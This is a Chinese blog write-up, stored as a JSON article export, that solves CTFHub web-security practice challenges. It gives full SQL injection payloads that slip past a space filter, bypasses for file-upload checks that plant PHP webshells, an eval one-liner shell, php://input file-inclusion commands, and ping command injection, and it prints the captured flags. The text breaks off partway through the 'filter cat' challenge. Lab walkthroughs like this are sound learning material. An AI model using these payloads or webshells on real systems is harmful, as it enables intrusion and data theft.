{"title":"CTFHub技能树web完结","uid":"95413dc0d7a5fa9cf97869672d0df757","slug":"CTFHub技能树web完结","date":"2020-06-27T08:03:19.000Z","updated":"2020-09-21T09:18:52.000Z","comments":true,"path":"api/articles/CTFHub技能树web完结.json","keywords":"A1andNS","cover":[],"content":"<h2 id=\"XSS之反射性\"><a href=\"#XSS之反射性\" class=\"headerlink\" title=\"XSS之反射性\"></a>XSS之反射性</h2><p>用了一个XSS平台叫xss8.cc</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628121403.png\" alt=\"首页\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628121447.png\" alt=\"XSS8\"></p>\n<p>cookie : flag=ctfhub{c6deb9f1323dc3d8ed565bcd6e5382e91aee9c5b}</p>\n<h2 id=\"SQL-过滤空格\"><a href=\"#SQL-过滤空格\" class=\"headerlink\" title=\"SQL-过滤空格\"></a>SQL-过滤空格</h2><p>这个最近新更新的技能树内容，空格被过滤了，要想办法来绕过啊。</p>\n<p>出现空格就是hack</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628143206.png\" alt=\"image-20200628143204779\"></p>\n<p><code>+</code>是不能用了，用了一样hack。那么试着用<code>/**/</code>来代替空格试一下。发现是可以绕过限制的，正常显示了。那么就常规套路了。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">order</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">by</span><span class=\"token comment\">/**/</span><span class=\"token number\">2</span>\n<span class=\"token comment\">#确定为列数为2</span>\n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">union</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">select</span><span class=\"token comment\">/**/</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span>\n<span class=\"token comment\">#确认显示位为data处</span>\n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">union</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">select</span><span class=\"token comment\">/**/</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">from</span><span class=\"token comment\">/**/</span>information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">where</span><span class=\"token comment\">/**/</span>table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n读出表名有news<span class=\"token punctuation\">,</span>mknmyejbdf\n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">union</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">select</span><span class=\"token comment\">/**/</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">from</span><span class=\"token comment\">/**/</span>information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">where</span><span class=\"token comment\">/**/</span>table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">/**/</span><span class=\"token operator\">and</span><span class=\"token comment\">/**/</span>table_name<span class=\"token operator\">=</span><span class=\"token string\">'mknmyejbdf'</span>\n读出列明有whhjvlxevw\n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">union</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">select</span><span class=\"token comment\">/**/</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>whhjvlxevw<span class=\"token punctuation\">)</span><span class=\"token comment\">/**/</span><span class=\"token keyword\">from</span><span class=\"token comment\">/**/</span>mknmyejbdf\n读出flag\nctfhub&#123;<span class=\"token number\">7</span>e307d32bae075ed6b54181c83201c397b38a7ff&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"文件上传-无验证\"><a href=\"#文件上传-无验证\" class=\"headerlink\" title=\"文件上传-无验证\"></a>文件上传-无验证</h2><p>没什么好说的，直接上传php木马，蚁剑连一下就好了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628150603.png\" alt=\"image-20200628145756614\"></p>\n<p>在html文件夹下拿到flag</p>\n<?php // ctfhub{e1bf30f9e0b6fdb74a67db928adcc8a2bea15cc0}\n\n## 文件上传-前端验证\n\n前端验证可以在网页上传时上传jpg后缀，只需要在burp里面改一下提交时的名称后缀名为php就好了。\n\n还有一种更加简单的办法，直接吧前端验证的模块给他删除就好了。把这里的onsubmit的内容全部删除就好了。\n\n![image-20200628150253031](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628150555.png)\n\n下面就是用蚁剑连接已经上传的webshell。\n\n<?php // ctfhub{ff178569c025a6b1666f528343967725458540dd}\n\n## 文件上传-.htaccess\n\nhtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n\n一开始尝试上传了一个PHP后缀的webshell，当然它没法访问。\n\n写入到.htaccess文件里\n\n<pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">AddType application&#x2F;x-httpd-php .jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n并且把它上传，这样他就会吧.jpg文件来当作php文件来执行了。\n\n这个时候上传后缀改为jpg的webshell就好了。\n\n蚁剑连接拿flag\n\n<?php // ctfhub{6368346c09f89618a661b93d2dc94e800c29fd80}\n\n## 文件上传-MIME\n\n直接在burp里改包，吧文件类型改为image/jpeg就好了。\n\n老套路\n\n<?php // ctfhub{925cd494ed02b7c479fda8536d869fcbce84963d}\n\n## 文件上传-00截断\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$ext</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'extension'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"jpg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"png\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"gif\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$des</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'road'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"/\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$ext</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$des</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('上传成功')&lt;/script>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('上传失败')&lt;/script>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件类型不匹配\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n![image-20200628170709177](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628170722.png)\n\n不会回显地址了，没事/upload/下没有错，和原来一样连一下。\n\n<?php // ctfhub{85b4d3963df26d5b3d4d879e5069921f39bde70c}\n\n## 文件上传-双写后缀\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php5\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php4\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php3\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"phtml\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"pht\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jspa\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jspx\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jsw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jsv\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jspf\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jtml\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"asp\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"aspx\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"asa\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"asax\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"ascx\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"ashx\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"asmx\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"cer\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"swf\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"htaccess\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"ini\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n因为对后缀的过滤使用了空替换的方式，所以可以通过嵌套后缀的方式来绕过，构造一个`.pphphp`的后缀，系统会吧中间嵌套的php替换为''，那么最后就是`.php`，后缀了。\n\n蚁剑连接我们上传的webshell\n\n<?php // ctfhub{17389dd067e22e1964314532d1e5bcb13d6a10c9}\n\n## 文件上传-文件头校验\n\n这样光光改了type是没有用的，所以我们要给它加上一个文件头\n\n![image-20200628175828727](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628181655.png)\n\n在文件头部添加GIF8即可绕过了。\n\n![image-20200628180114105](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628181637.png)\n\n老套路访问get flag：\n\n<?php // ctfhub{fbce0f6cf4fbcf71f6f9f041334ec1803cb83ff3}\n\n## RCE-文件包含\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hacker!!!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">></span></span>\ni have a <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>shell.txt<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>shell<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>, how to use it ?<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n开局给源码，strpos函数查找字符串在另一字符串中第一次出现的位置（区分大小写）\n\n访问一下shell.txt吧\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfhub'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n这是一个一句话shell，这里的$_REQUESR相当于GET+POST。按照代码审计的结果,先GET传参进去\n\n![image-20200628181408429](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628181410.png)\n\n也就是文件包含shell.txt文件，然后POST传参来RCE\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//payload：</span>\nctfhub<span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//index.php shell.txt</span>\n<span class=\"token comment\">//在这个目录下没有我们需要的东西，那就只能排查一些主要位置了</span>\nctfhub<span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls /\"</span><span class=\"token punctuation\">)</span>；\n<span class=\"token comment\">//发现了flag</span>\nctfhub<span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls /flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//发现不是目录</span>\nctfhub<span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat /flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//读出flag</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n![image-20200628182105739](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628182228.png)\n\n![image-20200628182350011](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628182351.png)\n\nctfhub{75677dc8bfc33e2fa49fa77d8e005c7b7032eb2e}\n\n## RCE-远程包含\n\n依旧给我源码\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hacker!!!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">></span></span>\ni don't have shell, how to get flag?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>phpinfo.php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>phpinfo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n基本一样的源码，访问一下phpinfo.php看看。\n\n![image-20200628182727126](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628182947.png)\n\n可以看到根目录为/var/www/html\n\n使用file参数传入，文件包含，正常显示phpinfo。\n\n![image-20200628183431623](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628184825.png)\n\n所以用`?file=php://input`来构造payload，但是要注意的是GET类型的数据是要过滤的，所以flag有关操作最好用post类型。\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//payload\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n//没有需要的东西\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls /\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat /flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n不知道为什么我的hackbar的post请求没有用，只能用burp了。\n\n![image-20200628184656573](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628184817.png)\n\n接下来是/目录了\n\n![image-20200628184808751](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628184810.png)\n\n看到了flag\n\n![image-20200628184947633](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628184948.png)\n\nctfhub{7858a5c89ecb8faa952bac39aeaa49c62a6fbf7c}\n\n## RCE-命令注入\n\n给出来源码，审计一下。\n\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $cmd &#x3D; &quot;ping -c 4 &#123;$_GET[&#39;ip&#39;]&#125;&quot;;\n    exec($cmd, $res);\n&#125;\n\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-无过滤&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-无过滤&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n可以执行ping命令查询，可以通过管道符来，执行其他命令。\n\n![image-20200628221522504](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222756.png)\n\n读一下啊27113349415869.php\n\n![image-20200628221650462](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222743.png)\n\n没有直接回显内容，查看源代码\n\n![image-20200628221811374](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222736.png)\n\nctfhub{1286ba20f54e94b4df254c3d31f37da5d4f04b86}\n\n## RCE-过滤cat\n\n过滤了cat命令之后，你还有什么方法能读到 Flag?\n\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F;cat&#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-过滤cat&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-过滤cat&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; 